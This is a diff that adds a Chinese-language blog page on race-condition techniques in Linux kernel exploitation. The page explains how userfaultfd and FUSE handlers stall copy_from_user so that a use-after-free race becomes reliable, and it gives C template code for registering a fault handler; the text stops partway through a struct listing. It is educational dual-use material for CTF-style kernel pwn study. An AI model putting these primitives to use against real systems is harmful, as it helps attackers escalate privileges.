@@ -1,0 +1,901 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="Content-Security-Policy" content="default-src * 'unsafe-inline' 'unsafe-eval' data: blob:;">
+    <title>条件竞争</title>
+    <link rel="icon" type="image/svg+xml" href="/favicon.svg">
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <header>
+        <nav class="site-nav">
+            <a href="./index.html" class="nav-link">/home</a>
+            <span class="nav-separator">|</span>
+            <a href="./about.html" class="nav-link">/about</a>
+        </nav>
+        <div class="terminal-prompt">
+            <span style="color:#666">[</span><span style="color:#fabd2f">ayoung</span><span style="color:#666">@</span><span style="color:#59adeb">lab</span> <span style="color:#83a598"><a href="./index.html" class="path-link">posts</a></span><span style="color:#666">]$</span> 
+            <span class="cmd">cat ./条件竞争.md</span><span class="cursor">█</span>
+        </div>
+        <h1 class="post-title">条件竞争</h1><div style="color: #666; font-size: 0.8rem; margin-bottom: 20px;">[Last modified: 2024-09-28]</div>
+    </header>
+    <div class="layout-grid">
+                <main><h2 id="userfaultfd">userfaultfd</h2><h3 id="gai-shu">概述</h3><p>userfaultfd是Linux提供的一种让用户自己处理缺页异常的机制，在kernel pwn中用于提高条件竞争的成功率</p>
+<p>如果我们的<code>user_buf</code>是一块<code>mmap</code>映射的，并且未初始化的区域，此时就会触发缺页错误，<code>copy_from_user</code>将暂停执行</p>
+<pre style="background-color:#2b303b;">
+<span style="color:#8fa1b3;">copy_from_user</span><span style="color:#c0c5ce;">(kptr, user_buf, size);
+</span></pre>
+<p>如果在进入函数后，实际拷贝开始前线程被中断换下 CPU，别的线程执行，修改了 kptr 指向的内存块的所有权（比如 kfree 掉了这个内存块），然后再执行拷贝时就可以实现 UAF。这种可能性当然是比较小的，但是如果 <code>user_buf</code> 是一个 <code>mmap</code> 的内存块，并且我们为它注册了 <code>userfaultfd</code>，那么在拷贝时出现缺页异常后此线程会先执行我们注册的处理函数，在处理函数结束前线程一直被暂停，结束后才会执行后面的操作，大大增加了竞争的成功率。</p>
+<p>严格意义而言 userfaultfd 并非是一种利用手法，而是 Linux 的一个系统调用，简单来说，通过 userfaultfd 这种机制，用户可以通过自定义的 page fault handler 在用户态处理缺页异常</p>
+<p>下面的这张图很好地体现了 userfaultfd 的整个流程：
+<img src="./images/t01938a7f50e9c27b9a.png" alt="" />
+要使用 userfaultfd 系统调用，我们首先要注册一个 userfaultfd，通过 ioctl 监视一块内存区域，同时还需要专门启动一个用以进行轮询的线程 uffd monitor，该线程会通过 poll() 函数不断轮询直到出现缺页异常</p>
+<p>当有一个线程在这块内存区域内触发缺页异常时（比如说第一次访问一个匿名页），该线程（称之为 faulting 线程）进入到内核中处理缺页异常
+内核会调用 <code>handle_userfault()</code> 交由 <code>userfaultfd</code> 处理
+随后 faulting 线程进入堵塞状态，同时将一个 <code>uffd_msg</code> 发送给 monitor 线程，等待其处理结束
+monitor 线程调用通过 <code>ioctl</code> 处理缺页异常，有如下选项：
+<code>UFFDIO_COPY</code>：将用户自定义数据拷贝到 faulting page 上
+<code>UFFDIO_ZEROPAGE</code> ：将 faulting page 置0
+<code>UFFDIO_WAKE</code>：用于配合上面两项中 <code>UFFDIO_COPY_MODE_DONTWAKE</code> 和 <code>UFFDIO_ZEROPAGE_MODE_DONTWAKE</code> 模式实现批量填充
+在处理结束后 monitor 线程发送信号唤醒 faulting 线程继续工作
+以上便是 userfaultfd 这个机制的整个流程，该机制最初被设计来用以进行虚拟机/进程的迁移等用途</p>
+<h3 id="shi-yong-fang-fa">使用方法</h3><p>详细的可以参考man page
+一个模板如下</p>
+<pre style="background-color:#2b303b;">
+<span style="color:#b48ead;">void </span><span style="color:#8fa1b3;">ErrExit</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;">* </span><span style="color:#bf616a;">err_msg</span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">{
+</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(err_msg);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">exit</span><span style="color:#c0c5ce;">(-</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">}
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">void </span><span style="color:#8fa1b3;">RegisterUserfault</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">fault_page</span><span style="color:#c0c5ce;">,</span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">handler</span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">{
+</span><span style="color:#c0c5ce;">    pthread_t thr;
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> uffdio_api ua;
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> uffdio_register ur;
+</span><span style="color:#c0c5ce;">    uint64_t uffd  = </span><span style="color:#8fa1b3;">syscall</span><span style="color:#c0c5ce;">(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
+</span><span style="color:#c0c5ce;">    ua.</span><span style="color:#bf616a;">api </span><span style="color:#c0c5ce;">= UFFD_API;
+</span><span style="color:#c0c5ce;">    ua.</span><span style="color:#bf616a;">features </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">ioctl</span><span style="color:#c0c5ce;">(uffd, UFFDIO_API, &amp;ua) == -</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">ErrExit</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[-] ioctl-UFFDIO_API</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    ur.</span><span style="color:#bf616a;">range</span><span style="color:#c0c5ce;">.</span><span style="color:#bf616a;">start </span><span style="color:#c0c5ce;">= (</span><span style="color:#b48ead;">unsigned long</span><span style="color:#c0c5ce;">)fault_page; </span><span style="color:#65737e;">//我们要监视的区域
+</span><span style="color:#c0c5ce;">    ur.</span><span style="color:#bf616a;">range</span><span style="color:#c0c5ce;">.</span><span style="color:#bf616a;">len   </span><span style="color:#c0c5ce;">= PAGE_SIZE;
+</span><span style="color:#c0c5ce;">    ur.</span><span style="color:#bf616a;">mode        </span><span style="color:#c0c5ce;">= UFFDIO_REGISTER_MODE_MISSING;
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">ioctl</span><span style="color:#c0c5ce;">(uffd, UFFDIO_REGISTER, &amp;ur) == -</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">) </span><span style="color:#65737e;">//注册缺页错误处理
+</span><span style="color:#c0c5ce;">        </span><span style="color:#65737e;">//当发生缺页时，程序会阻塞，此时，我们在另一个线程里操作
+</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">ErrExit</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[-] ioctl-UFFDIO_REGISTER</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">//开一个线程，接收错误的信号，然后处理
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> s = </span><span style="color:#8fa1b3;">pthread_create</span><span style="color:#c0c5ce;">(&amp;thr, </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">,handler, (</span><span style="color:#b48ead;">void</span><span style="color:#c0c5ce;">*)uffd);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(s!=</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">ErrExit</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[-] pthread_create</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">}
+</span></pre>
+<p>注册的时候，只要用只要使用类似于</p>
+<pre style="background-color:#2b303b;">
+<span style="color:#8fa1b3;">RegisterUserfault</span><span style="color:#c0c5ce;">(mmap_buf, handler);
+</span></pre>
+<p>的操作就可以把<code>handler</code>函数绑定到<code>mmap_buf</code>，当mmap_buf出现缺页异常事就会调用<code>handler</code>来处理</p>
+<p>比较重要的是handler的写法，开头是一些模板化的操作</p>
+<pre style="background-color:#2b303b;">
+<span style="color:#b48ead;">void</span><span style="color:#c0c5ce;">* </span><span style="color:#8fa1b3;">userfaultfd_leak_handler</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">void</span><span style="color:#c0c5ce;">* </span><span style="color:#bf616a;">arg</span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">{
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> uffd_msg msg;
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">unsigned long</span><span style="color:#c0c5ce;"> uffd = (</span><span style="color:#b48ead;">unsigned long</span><span style="color:#c0c5ce;">) arg;
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> pollfd pollfd;
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> nready;
+</span><span style="color:#c0c5ce;">    pollfd.</span><span style="color:#bf616a;">fd </span><span style="color:#c0c5ce;">= uffd;
+</span><span style="color:#c0c5ce;">    pollfd.</span><span style="color:#bf616a;">events </span><span style="color:#c0c5ce;">= POLLIN;
+</span><span style="color:#c0c5ce;">    nready = </span><span style="color:#8fa1b3;">poll</span><span style="color:#c0c5ce;">(&amp;pollfd, </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">, -</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">);
+</span></pre>
+<p>定义一个 <code>uffd_msg</code> 类型的结构体在未来接受消息</p>
+<p>需要一个 <code>pollfd</code> 类型的结构体提供给轮询操作，其 fd 设置为传入的 <code>arg</code>，<code>events</code> 设置为 <code>POLLIN</code>。然后执行 <code>poll(&amp;pollfd, 1, -1);</code> 来进行轮询，这个函数会一直进行轮询，直到出现缺页错误</p>
+<p>然后需要处理缺页</p>
+<pre style="background-color:#2b303b;">
+<span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">sleep</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">3</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(nready != </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">    {
+</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">ErrExit</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[-] Wrong poll return val</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">    }
+</span><span style="color:#c0c5ce;">    nready = </span><span style="color:#8fa1b3;">read</span><span style="color:#c0c5ce;">(uffd, &amp;msg, sizeof(msg));
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(nready &lt;= </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">    {
+</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">ErrExit</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[-] msg err</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">    }
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;">* page = (</span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;">*) </span><span style="color:#8fa1b3;">mmap</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(page == MAP_FAILED)
+</span><span style="color:#c0c5ce;">    {
+</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">ErrExit</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[-] mmap err</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">    }
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> uffdio_copy uc;
+</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">// init page
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">memset</span><span style="color:#c0c5ce;">(page, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, sizeof(page));
+</span><span style="color:#c0c5ce;">    uc.</span><span style="color:#bf616a;">src </span><span style="color:#c0c5ce;">= (</span><span style="color:#b48ead;">unsigned long</span><span style="color:#c0c5ce;">) page;
+</span><span style="color:#c0c5ce;">    uc.</span><span style="color:#bf616a;">dst </span><span style="color:#c0c5ce;">= (</span><span style="color:#b48ead;">unsigned long</span><span style="color:#c0c5ce;">) msg.</span><span style="color:#bf616a;">arg</span><span style="color:#c0c5ce;">.</span><span style="color:#bf616a;">pagefault</span><span style="color:#c0c5ce;">.</span><span style="color:#bf616a;">address </span><span style="color:#c0c5ce;">&amp; ~(PAGE_SIZE - </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">    uc.</span><span style="color:#bf616a;">len </span><span style="color:#c0c5ce;">= PAGE_SIZE;
+</span><span style="color:#c0c5ce;">    uc.</span><span style="color:#bf616a;">mode </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">    uc.</span><span style="color:#bf616a;">copy </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">ioctl</span><span style="color:#c0c5ce;">(uffd, UFFDIO_COPY, &amp;uc);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[+] leak handler done</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">;
+</span><span style="background-color:#bf616a;color:#2b303b;">}</span><span style="color:#c0c5ce;">
+</span></pre>
+<p>注意开头加入了 sleep 操作，在 poll 结束返回时就代表着出现了缺页了，此时 sleep 就可以起到之前说到的暂停线程的效果。然后进行一些判断什么的，并 mmap 一个页给缺页的页，都是模板化的操作。此处 mmap 的内存在缺页时有自己的处理函数，所以不会一直套娃地缺页下去</p>
+<p>我们这里在遇到返回值错误的时候就直接错误退出了，在工程上应该会讲究一些，还会在外面套一个大死循环什么的，这里就不多说了，毕竟我们只需要利用它把线程暂停就可以了</p>
+<h2 id="fuse">FUSE</h2><p>简单说就是userfaultfd handler被替换成了FUSE文件操作的read callback函数。当缺页异常发生时，FUSE callback将被调用。</p>
+<h3 id="gai-shu">概述</h3><p>FUSE 是一个用户层文件系统框架，允许用户实现自己的文件系统。用户可以在该框架中注册 handler，来指定应对文件操作请求。这样一来便可以在实际操作文件之前，执行 handler 暂停内核执行，尽可能地延长窗口。</p>
+<p>三个组成部分：</p>
+<ul>
+<li>fuse内核模块，它将fuse文件上的请求转发给用户空间回调</li>
+<li><code>libfuse</code> 用户空间组件</li>
+<li><code>fusermount</code> 用于卸载fuse文件系统的工具</li>
+</ul>
+<p>此时如果在该目录中有相关操作时，请求会经过VFS到fuse的内核模块，fuse内核模块根据请求类型，调用用户态应用注册的函数，然后将处理结果通过VFS返回给系统调用（步骤3）。<a href="https://zhuanlan.zhihu.com/p/59354174">参考</a></p>
+<p><img src="./images/Pasted%20image%2020240823010354.png" alt="" /></p>
+<p><a href="https://github.com/libfuse/libfuse/blob/6adcb719a933a31013c73fda8e0ccb0e13b45e58/include/fuse.h">fuse_operations</a>结构如下</p>
+<pre style="background-color:#2b303b;">
+<span style="color:#b48ead;">struct </span><span style="color:#c0c5ce;">fuse_operations {
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int </span><span style="color:#c0c5ce;">(*getattr) (</span><span style="color:#b48ead;">const char </span><span style="color:#c0c5ce;">*, </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> stat *);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int </span><span style="color:#c0c5ce;">(*readlink) (</span><span style="color:#b48ead;">const char </span><span style="color:#c0c5ce;">*, </span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">*, size_t);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int </span><span style="color:#c0c5ce;">(*getdir) (</span><span style="color:#b48ead;">const char </span><span style="color:#c0c5ce;">*, fuse_dirh_t, fuse_dirfil_t);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int </span><span style="color:#c0c5ce;">(*mknod) (</span><span style="color:#b48ead;">const char </span><span style="color:#c0c5ce;">*, mode_t, dev_t);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int </span><span style="color:#c0c5ce;">(*mkdir) (</span><span style="color:#b48ead;">const char </span><span style="color:#c0c5ce;">*, mode_t);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int </span><span style="color:#c0c5ce;">(*unlink) (</span><span style="color:#b48ead;">const char </span><span style="color:#c0c5ce;">*);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int </span><span style="color:#c0c5ce;">(*rmdir) (</span><span style="color:#b48ead;">const char </span><span style="color:#c0c5ce;">*);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int </span><span style="color:#c0c5ce;">(*symlink) (</span><span style="color:#b48ead;">const char </span><span style="color:#c0c5ce;">*, </span><span style="color:#b48ead;">const char </span><span style="color:#c0c5ce;">*);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int </span><span style="color:#c0c5ce;">(*rename) (</span><span style="color:#b48ead;">const char </span><span style="color:#c0c5ce;">*, </span><span style="color:#b48ead;">const char </span><span style="color:#c0c5ce;">*);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int </span><span style="color:#c0c5ce;">(*link) (</span><span style="color:#b48ead;">const char </span><span style="color:#c0c5ce;">*, </span><span style="color:#b48ead;">const char </span><span style="color:#c0c5ce;">*);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int </span><span style="color:#c0c5ce;">(*chmod) (</span><span style="color:#b48ead;">const char </span><span style="color:#c0c5ce;">*, mode_t);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int </span><span style="color:#c0c5ce;">(*chown) (</span><span style="color:#b48ead;">const char </span><span style="color:#c0c5ce;">*, uid_t, gid_t);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int </span><span style="color:#c0c5ce;">(*truncate) (</span><span style="color:#b48ead;">const char </span><span style="color:#c0c5ce;">*, off_t);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int </span><span style="color:#c0c5ce;">(*utime) (</span><span style="color:#b48ead;">const char </span><span style="color:#c0c5ce;">*, </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> utimbuf *);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int </span><span style="color:#c0c5ce;">(*open) (</span><span style="color:#b48ead;">const char </span><span style="color:#c0c5ce;">*, </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> fuse_file_info *);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int </span><span style="color:#c0c5ce;">(*read) (</span><span style="color:#b48ead;">const char </span><span style="color:#c0c5ce;">*, </span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">*, size_t, off_t,
+</span><span style="color:#c0c5ce;">             </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> fuse_file_info *);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int </span><span style="color:#c0c5ce;">(*write) (</span><span style="color:#b48ead;">const char </span><span style="color:#c0c5ce;">*, </span><span style="color:#b48ead;">const char </span><span style="color:#c0c5ce;">*, size_t, off_t,
+</span><span style="color:#c0c5ce;">              </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> fuse_file_info *);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int </span><span style="color:#c0c5ce;">(*statfs) (</span><span style="color:#b48ead;">const char </span><span style="color:#c0c5ce;">*, </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> statvfs *);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int </span><span style="color:#c0c5ce;">(*flush) (</span><span style="color:#b48ead;">const char </span><span style="color:#c0c5ce;">*, </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> fuse_file_info *);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int </span><span style="color:#c0c5ce;">(*release) (</span><span style="color:#b48ead;">const char </span><span style="color:#c0c5ce;">*, </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> fuse_file_info *);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int </span><span style="color:#c0c5ce;">(*fsync) (</span><span style="color:#b48ead;">const char </span><span style="color:#c0c5ce;">*, </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> fuse_file_info *);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int </span><span style="color:#c0c5ce;">(*setxattr) (</span><span style="color:#b48ead;">const char </span><span style="color:#c0c5ce;">*, </span><span style="color:#b48ead;">const char </span><span style="color:#c0c5ce;">*, </span><span style="color:#b48ead;">const char </span><span style="color:#c0c5ce;">*, size_t, </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int </span><span style="color:#c0c5ce;">(*getxattr) (</span><span style="color:#b48ead;">const char </span><span style="color:#c0c5ce;">*, </span><span style="color:#b48ead;">const char </span><span style="color:#c0c5ce;">*, </span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">*, size_t);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int </span><span style="color:#c0c5ce;">(*listxattr) (</span><span style="color:#b48ead;">const char </span><span style="color:#c0c5ce;">*, </span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">*, size_t);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int </span><span style="color:#c0c5ce;">(*removexattr) (</span><span style="color:#b48ead;">const char </span><span style="color:#c0c5ce;">*, </span><span style="color:#b48ead;">const char </span><span style="color:#c0c5ce;">*);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int </span><span style="color:#c0c5ce;">(*opendir) (</span><span style="color:#b48ead;">const char </span><span style="color:#c0c5ce;">*, </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> fuse_file_info *);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int </span><span style="color:#c0c5ce;">(*readdir) (</span><span style="color:#b48ead;">const char </span><span style="color:#c0c5ce;">*, </span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*, fuse_fill_dir_t, off_t,
+</span><span style="color:#c0c5ce;">            </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> fuse_file_info *);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int </span><span style="color:#c0c5ce;">(*releasedir) (</span><span style="color:#b48ead;">const char </span><span style="color:#c0c5ce;">*, </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> fuse_file_info *);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int </span><span style="color:#c0c5ce;">(*fsyncdir) (</span><span style="color:#b48ead;">const char </span><span style="color:#c0c5ce;">*, </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> fuse_file_info *);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*(*init) (</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> fuse_conn_info *conn);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">(*destroy) (</span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int </span><span style="color:#c0c5ce;">(*access) (</span><span style="color:#b48ead;">const char </span><span style="color:#c0c5ce;">*, </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int </span><span style="color:#c0c5ce;">(*create) (</span><span style="color:#b48ead;">const char </span><span style="color:#c0c5ce;">*, mode_t, </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> fuse_file_info *);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int </span><span style="color:#c0c5ce;">(*ftruncate) (</span><span style="color:#b48ead;">const char </span><span style="color:#c0c5ce;">*, off_t, </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> fuse_file_info *);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int </span><span style="color:#c0c5ce;">(*fgetattr) (</span><span style="color:#b48ead;">const char </span><span style="color:#c0c5ce;">*, </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> stat *, </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> fuse_file_info *);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int </span><span style="color:#c0c5ce;">(*lock) (</span><span style="color:#b48ead;">const char </span><span style="color:#c0c5ce;">*, </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> fuse_file_info *, </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> cmd,
+</span><span style="color:#c0c5ce;">             </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> flock *);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int </span><span style="color:#c0c5ce;">(*utimens) (</span><span style="color:#b48ead;">const char </span><span style="color:#c0c5ce;">*, </span><span style="color:#b48ead;">const struct</span><span style="color:#c0c5ce;"> timespec tv[</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">]);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int </span><span style="color:#c0c5ce;">(*bmap) (</span><span style="color:#b48ead;">const char </span><span style="color:#c0c5ce;">*, size_t blocksize, uint64_t *idx);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int </span><span style="color:#c0c5ce;">(*ioctl) (</span><span style="color:#b48ead;">const char </span><span style="color:#c0c5ce;">*, </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> cmd, </span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*arg,
+</span><span style="color:#c0c5ce;">              </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> fuse_file_info *, </span><span style="color:#b48ead;">unsigned int</span><span style="color:#c0c5ce;"> flags, </span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*data);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int </span><span style="color:#c0c5ce;">(*poll) (</span><span style="color:#b48ead;">const char </span><span style="color:#c0c5ce;">*, </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> fuse_file_info *,
+</span><span style="color:#c0c5ce;">             </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> fuse_pollhandle *ph, </span><span style="color:#b48ead;">unsigned </span><span style="color:#c0c5ce;">*reventsp);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int </span><span style="color:#c0c5ce;">(*write_buf) (</span><span style="color:#b48ead;">const char </span><span style="color:#c0c5ce;">*, </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> fuse_bufvec *buf, off_t off,
+</span><span style="color:#c0c5ce;">              </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> fuse_file_info *);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int </span><span style="color:#c0c5ce;">(*read_buf) (</span><span style="color:#b48ead;">const char </span><span style="color:#c0c5ce;">*, </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> fuse_bufvec **bufp,
